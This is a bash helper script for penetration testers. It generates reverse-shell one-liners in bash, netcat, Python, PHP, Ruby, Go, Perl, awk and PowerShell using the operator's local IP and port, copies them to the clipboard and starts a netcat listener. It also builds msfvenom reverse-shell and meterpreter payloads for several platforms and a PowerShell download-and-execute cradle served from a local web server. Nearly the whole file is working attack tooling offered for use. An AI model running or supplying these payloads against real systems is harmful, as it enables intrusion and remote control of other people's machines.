#!/bin/bash

#clipboard function

copy_line () {
	printf "copy to clipboard? y/any other key to continue\n"
	read -n1 INPUT
	printf "\n"
	case "$INPUT" in
	y) echo "$1" | xsel --clipboard --input
	printf "\ncopied to clipboard!\n"
	;;
	*) 
	;;
	esac
}

copy_lineexit () {
        printf "copy to clipboard? y/any other key to exit\n"
        read -n1 INPUT
        printf "\n"
        case "$INPUT" in
        y) echo "$1" | xsel --clipboard --input
        printf "\ncopied to clipboard!\n"
        ;;
        *) printf "\nexiting...\n\n"
        ;;
        esac
}

#listener function

start_listener() {
	printf "\nstart listener? y/any other key for exit\n"
	read -n1 INPUT
	printf "\n"
	case "$INPUT" in
	y) printf "\n" 
	nc -lvnp $1
	;;
	*) printf "\nexiting...\n\n" 
	exit
	;;
	esac
}

#python webserver function

start_webserver() {
        printf "\nstart web server in this directory? y/any other key for exit\n"
        read -n1 INPUT
        printf "\n"
        case "$INPUT" in
        y) printf "\n"
        python -m SimpleHTTPServer $1
        ;;
        *) printf "\nexiting...\n\n"
        exit
        ;;
        esac
}

#venom function

create_venom() {
	printf "\ncreate venom? y/any other key for exit \n"	
	read -n1 INPUT
	printf "\n"
	case "$INPUT" in
	y) printf "\n" 
	bash -c "$1"
	;;
	*) printf "\nexiting...\n\n"
	exit
	;;
	esac
}

#display message

display_msg() {
	printf "\nfor reverse shell line
usage:          ./lineplease.sh [options] [interface] [port]
example:        ./lineplease.sh -b eth0 1337

y to copy line to clipboard/any other key to continue
y to start netcat listener/any other key to exit

for msfvenom
usage:          ./lineplease.sh [options] [interface] [port] [name]
example:        ./lineplease.sh -m1 tun0 1337 rev

y to create file/any other key to exit

-h for help
example:        ./lineplease.sh -h | grep bash\n\n"
exit
}

#variables

IP=$(ip addr show $2 | grep "inet" | awk '{print $2}' | cut -d/ -f1 | head -n 1)
PORT=$3

#help section

if [[ $# -lt 1 ]]; 
then
display_msg
exit
fi

if [[ $# == 1 ]];
then

case "$1" in

-h) 
printf "  
                      __   _____  ______
                     / /  /  _/ |/ / __/
                    / /___/ //    / _/  
         ___  __   /____/___/_/|_/___/  
        / _ \/ /  / __/ _ | / __/ __/   
       / ___/ /__/ _// __ |_\ \/ _/     
      /_/  /____/___/_/ |_/___/___/     

"
printf '"You thought your secrets were safe...you..ehmm...line please!!"'
printf "\n\n"          
printf "helper script to load up reverse shell oneliners\n\n"
printf "author: rub3rth\n\n"
printf "oneliners from PayLoadAllTheThings\n"
printf "https://github.com/swisskyrepo/PayloadsAllTheThings\n\n"
printf "\nfor reverse shell line
usage: 		./lineplease.sh [options] [interface] [port]
example: 	./lineplease.sh -b eth0 1337

(ipv4-address on desired interface is inserted into line)

when prompted:  y to copy line to clipboard or any other key to continue (requires xsel)
		y to start netcat listener or any other key to exit

for msfvenom (requires msfvenom):
usage: 		./lineplease.sh [options] [interface] [port] [name]
example: 	./lineplease.sh -m2 tun0 1337 rev

when prompted: 	y to create file or any other key to exit

-h 		display this page
example:	./lineplease.sh -h | grep bash

options:

bash:
-b      	bash -i >& /dev/tcp/[ip]/[port] 0>&1
-be		0<&196;exec 196<>/dev/tcp/[ip]/[port]; sh <&196 >&196 2>&196
-bc     	bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'

netcat:
-n      	nc -e /bin/bash [ip] [port]
-ns		nc -e /bin/sh [ip] [port]
-nc		nc -c bash [ip] [port]

python:
-py1		"
PY1=$(echo "export RHOST=~[ip]~;export RPORT=[port];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(~RHOST~),int(os.getenv(~RPORT~))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(~/bin/sh~)'" | sed s/\~/\"/g)
printf "$PY1"
printf "	
-py2		"
PY2=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~[ip]~,[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
printf "$PY2\n"
printf "
php
-p1		"
P1=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);exec(~/bin/sh -i <&3 >&3 2>&3~);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P1"
printf "
-p2		"
P2=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);shell_exec(~/bin/sh -i <&3 >&3 2>&3~);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P2"
printf "
-p3		"
P3=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);z/bin/sh -i <&3 >&3 2>&3z;'" | sed s/\+/\$/g | sed s/\~/\"/g | sed s/\z/\`/g)
printf "$P3"
printf "
-p4		"
P4=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);system(~/bin/sh -i <&3 >&3 2>&3~);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P4"
printf "
-p5		"
P5=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);passthru(~/bin/sh -i <&3 >&3 2>&3~);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P5"
printf "
-p6		"
P6=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);popen(~/bin/sh -i <&3 >&3 2>&3~, ~r~);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P6"
printf "
-p7		"
P7=$(echo "php -r '+sock=fsockopen(~[ip]~,[port]);+proc=proc_open(~/bin/sh -i~, array(0=>+sock, 1=>+sock, 2=>+sock),+pipes);'" | sed s/\+/\$/g | sed s/\~/\"/g)
printf "$P7\n"
printf "
ruby
-r		"
R=$(echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(~[ip]~,~[port]~);while(cmd=c.gets);IO.popen(cmd,~r~){|io|c.print io.read}end'" | sed s/\~/\"/g)
printf "$R"
printf "
-rw		"
RW=$(echo "ruby -rsocket -e 'c=TCPSocket.new(~[ip]~,~[port]~);while(cmd=c.gets);IO.popen(cmd,~r~){|io|c.print io.read}end'" | sed s/\~/\"/g)
printf "$RW	(windows only)\n"
printf "

golang:
-g		"
G=$(echo "echo 'package main;import~os/exec~;import~net~;func main(){c,_:=net.Dial(~tcp~,~[ip]:[port]~);cmd:=exec.Command(~/bin/sh~);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" | sed s/\~/\"/g)
printf "$G\n"
printf "
perl:
-pe		"
PE1=$(printf "perl -e 'use Socket;zi=~[ip]~;zp=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(~tcp~));if(connect(S,sockaddr_in(zp,inet_aton(zi)))){open(STDIN,~>&S~);open(STDOUT,~>&S~);open(STDERR,~>&S~);exec(~/bin/sh -i~);};'" | sed s/\~/\"/g | sed s/z/\$/g)
printf "$PE1"
printf "
-pe2		"
PE2=$(echo "perl -MIO -e 'zp=fork;exit,if(zp);zc=new IO::Socket::INET(PeerAddr,+[ip]:[port]+);STDIN->fdopen(zc,r);$~->fdopen(zc,w);systemz_ while<>;'" | sed s/\z/\$/g | sed s/\+/\"/g)
printf "$PE2"
printf "			
-pw		"
PW=$(echo "perl -MIO -e 'zc=new IO::Socket::INET(PeerAddr,+[ip]:[port]+);STDIN->fdopen(zc,r);$~->fdopen(zc,w);systemz_ while<>;'" | sed s/\z/\$/g | sed s/\+/\"/g)
printf "$PW	(windows only)"
printf "\n
awk:
-a		"		
AWK=$(printf "awk 'BEGIN {s = ~/inet/tcp/0/[ip]/[port]~; while(42) { do{ printf ~shell>~ |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print -0 |& s; close(c); } } while(c != ~exit~) close(s); }}' /dev/null" | sed s/\~/\"/g | sed s/-/\$/g)
printf "$AWK"
printf "\n
powershell:
-ps1            too long and messy to print out here
-ps2            same goes for this one

msfvenom unstaged:
-m1 		msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f exe > [name].exe
-m2		msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf > [name].elf
-m3     	msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f macho > [name].macho
-m4		msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].jsp
-m5		msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f war > [name].war
-m6		msfvenom -p cmd/unix/reverse_python LHOST=[ip] LPORT=[port] -f raw > [name].py
-m7		msfvenom -p cmd/unix/reverse_bash LHOST=[ip] LPORT=[port] -f raw > [name].sh
-m8		msfvenom -p cmd/unix/reverse_perl LHOST=[ip] LPORT=[port] -f raw > [name].pl\n"
printf "\nmsfvenom staged:
-m1s    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe > [name].exe
-m2s    	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf > [name].elf
-mas    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f asp > [name].asp\n"
printf "%s\n" "-mps		msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].php; cat [name].php | xsel --clipboard --input && echo '<?php ' | tr -d '\n' > [name].php && xsel --clipboard --output >> [name].php"
printf "                (requires xsel)\n"
printf "
lazy options:
-pl2		"
PL2=$(echo "python -c 'import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
printf "$PL2"
printf "
-pl3 		"
PL3=$(echo "python3 -c 'import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
printf "$PL3"
printf "\n\n		loads up line for python shell upgrade\n
		usage:		./lineplease.sh -pl2
		when prompted:  y to copy to clipboard (requires xsel)/any other key to exit\n
-psd		"
PSD=$(echo "powershell ~IEX(New-Object Net.WebClient).downloadString('http://[ip]:[port]/[filename]')~" | sed s/\~/\"/g)
printf "$PSD"
printf "\n\n		loads up a powershell command to download the file linpeas.sh from ip address of eth0\n
		usage:		./lineplease.sh -psd [interface] [port] [filename]
		example:	./lineplease.sh -psd eth0 1337 linpeas.sh
		when prompted:	y to copy to clipboard/any other key to continue
		when prompted:	y to start web server in current directory/any other key to exit\n\n"
;;

#lazy options section

-pl2) LINE="python -c 'import pty; pty.spawn(~/bin/bash~)'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_lineexit "$(printf "$LINE" | sed s/\~/\"/g)"
;;
-pl3) LINE="python3 -c 'import pty; pty.spawn(~/bin/bash~)'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_lineexit "$(printf "$LINE" | sed s/\~/\"/g)" 
;;
*) display_msg
;;
esac 
exit
fi

#main section

if [[ $# == 3 ]];
then

case  "$1" in

-b) LINE="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;
-bc) LINE="bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;
-be) LINE="0<&196;exec 196<>/dev/tcp/$IP/$PORT; sh <&196 >&196 2>&196"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;

-n) LINE="nc -e /bin/bash $IP $PORT"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;
-ns) LINE="nc -e /bin/sh $IP $PORT"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;
-nc) LINE="nc -c bash $IP $PORT"
printf "\n$LINE\n\n"
copy_line "$LINE"
start_listener "$PORT"
;;
-pe1) LINE="perl -e 'use Socket;zi=~$IP~;zp=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(~tcp~));if(connect(S,sockaddr_in(zp,inet_aton(zi)))){open(STDIN,~>&S~);open(STDOUT,~>&S~);open(STDERR,~>&S~);exec(~/bin/sh -i~);};'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g | sed s/z/\$/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g | sed s/z/\$/g)"
start_listener "$PORT"
;;
-pe2) LINE="perl -MIO -e 'zp=fork;exit,if(zp);zc=new IO::Socket::INET(PeerAddr,+$IP:$PORT+);STDIN->fdopen(zc,r);$~->fdopen(zc,w);systemz_ while<>;'"
printf "\n"
printf "$LINE" | sed s/\z/\$/g | sed s/\+/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\z/\$/g | sed s/\+/\"/g)"
start_listener "$PORT"
;;
-pw) LINE="perl -MIO -e 'zc=new IO::Socket::INET(PeerAddr,+$IP:$PORT+);STDIN->fdopen(zc,r);$~->fdopen(zc,w);systemz_ while<>;'"
printf "\n"
printf "$LINE" | sed s/\z/\$/g | sed s/\+/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\z/\$/g | sed s/\+/\"/g)"
start_listener "$PORT"
;;
-py1) LINE="export RHOST=~$IP~;export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(~RHOST~),int(os.getenv(~RPORT~))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(~/bin/sh~)'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-py2) LINE="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~$IP~,$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p1) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);exec(~/bin/sh -i <&3 >&3 2>&3~);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p2) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);shell_exec(~/bin/sh -i <&3 >&3 2>&3~);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p3) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);z/bin/sh -i <&3 >&3 2>&3z;'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g | sed s/\z/\`/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g | sed s/\z/\`/g)"
start_listener "$PORT"
;;
-p4) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);system(~/bin/sh -i <&3 >&3 2>&3~);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p5) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);passthru(~/bin/sh -i <&3 >&3 2>&3~);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p6) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);popen(~/bin/sh -i <&3 >&3 2>&3~, ~r~);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-p7) LINE="php -r '+sock=fsockopen(~$IP~,$PORT);+proc=proc_open(~/bin/sh -i~, array(0=>+sock, 1=>+sock, 2=>+sock),+pipes);'"
printf "\n"
printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\+/\$/g | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-r) LINE="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(~$IP~,~$PORT~);while(cmd=c.gets);IO.popen(cmd,~r~){|io|c.print io.read}end'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-rw) LINE="ruby -rsocket -e 'c=TCPSocket.new(~$IP~,~$PORT~);while(cmd=c.gets);IO.popen(cmd,~r~){|io|c.print io.read}end'"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_listener "$PORT"
;;
-g) LINE="echo 'package main;import~os/exec~;import~net~;func main(){c,_:=net.Dial(~tcp~,~$IP:$PORT~);cmd:=exec.Command(~/bin/sh~);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_listener "$PORT"
;;

-ps1) LINE=$(echo 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'$IP'",'$PORT');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | xxd -ps)
printf "\n"
printf "$LINE" | xxd -r -ps 
printf "\n"
copy_line "$(printf "$LINE" | xxd -r -ps)"
start_listener "$PORT"
;;
-ps2) LINE=$(echo 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(z'$IP'z,'$PORT');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + zPS z + (pwd).Path + z> z;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' | xxd -ps)
printf "\n"
printf "$LINE" | xxd -r -ps | sed s/z/\'/g
printf "\n"
copy_line "$(printf "$LINE" | xxd -r -ps | sed s/z/\'/g)"
start_listener "$PORT"
;;
-a) LINE="awk 'BEGIN {s = ~/inet/tcp/0/$IP/$PORT~; while(42) { do{ printf ~shell>~ |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print -0 |& s; close(c); } } while(c != ~exit~) close(s); }}' /dev/null"
printf "\n"
printf "$LINE" |  sed s/\~/\"/g | sed s/-/\$/g 
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g | sed s/-/\$/g)"
start_listener "$PORT"
;;
*) display_msg
;;
esac
exit
fi

#msfvenom and PSDownloadstring section

if [[ $1 != "-h" && $# == 4 ]];
then

NAME=$4

case "$1" in

-m1s) LINE="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > $NAME.exe"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m1) LINE="msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe > $NAME.exe"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m2s) LINE="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf > $NAME.elf"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m2) LINE="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf > $NAME.elf"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-mas) LINE="windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f asp > $NAME.asp"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m3) LINE="msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f macho > $NAME.macho"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m4) LINE="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > $NAME.jsp"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m5) LINE="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > $NAME.war"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m6) LINE="msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=$PORT -f raw > $NAME.py"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m7) LINE="msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=$PORT -f raw > $NAME.sh"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-m8) LINE="msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=$PORT -f raw > $NAME.pl"
printf "\n$LINE\n"
create_venom "$LINE"
;;
-mps) LINE="$(printf "%s\n" "msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > $NAME.php; cat $NAME.php | xsel --clipboard --input && echo '<?php ' | tr -d '\n' > $NAME.php && xsel --clipboard --output >> $NAME.php")"
printf "\n"
printf "%s\n" "$LINE"
printf "\n"
create_venom "$LINE"
;;
-psd) LINE="powershell ~IEX(New-Object Net.WebClient).downloadString('http://$IP:$PORT/$NAME')~"
printf "\n"
printf "$LINE" | sed s/\~/\"/g
printf "\n\n"
copy_line "$(printf "$LINE" | sed s/\~/\"/g)"
start_webserver "$PORT"
;;
*) display_msg 
;;
esac
exit
fi
if [[ $# -gt 4 ]];
then
display_msg
exit
fi
